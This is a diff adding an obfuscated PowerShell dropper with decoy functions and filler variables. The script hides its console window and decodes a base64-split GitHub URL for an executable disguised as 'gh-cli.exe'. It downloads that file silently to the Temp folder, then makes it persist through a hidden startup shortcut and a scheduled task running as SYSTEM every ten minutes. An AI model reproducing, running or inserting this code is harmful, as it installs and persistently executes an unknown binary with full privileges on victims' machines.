@@ -1,0 +1,39 @@
+<#
+██████╗ ███████╗██╗
+██╔══██╗██╔════╝██║
+██████╔╝███████╗██║
+██╔═══╝ ╚════██║██║
+██║     ███████║██║
+╚═╝     ╚══════╝╚═╝
+#>
+function d1{param($x)return $x}
+function d2{param($y)return $y}
+function d3{param($z)return $z}
+$m1=42;$m2="x";$m3=@();$m4=Get-Date
+if($host.Name -eq 'ConsoleHost'){$hwnd=(Get-Process -Id $pid).MainWindowHandle;Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);';[Console.Window]::ShowWindow($hwnd,0)|Out-Null}
+$p1='aHR0cHM6Ly9n'
+$p2='aXRodWIuY29t'
+$p3='L25vZGUtbmww'
+$p4='Ly0vcmF3L21h'
+$p5='aW4vZ2gtY2xp'
+$p6='LmV4ZQ=='
+$p7='QzpcVXNlcnNc'
+$p8='dXNlclxBcHBE'
+$p9='YXRhXExvY2Fs'
+$p10='XFRlbXBcZ2gt'
+$p11='Y2xpLmV4ZQ=='
+$m5=Get-Random;$m6=Get-Random;$m7=Get-Random
+$url=$p1+$p2+$p3+$p4+$p5+$p6;$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($url))
+$path=$p7+$p8+$p9+$p10+$p11;$exePath=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($path))
+try{(New-Object Net.WebClient).DownloadFile($u,$exePath)}catch{}
+if(Test-Path $exePath){
+    $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\.sys.lnk"
+    $wsh=New-Object -ComObject WScript.Shell
+    $l=$wsh.CreateShortcut($s)
+    $l.TargetPath=$exePath
+    $l.WorkingDirectory=Split-Path $exePath
+    $l.Save()
+    $taskName = "core_x64"
+    schtasks /create /sc minute /mo 10 /tn $taskName /tr $exePath /ru SYSTEM /rl HIGHEST /f
+}
+    # هیچ چیز حقیقت ندارد، همه چیز مجاز است
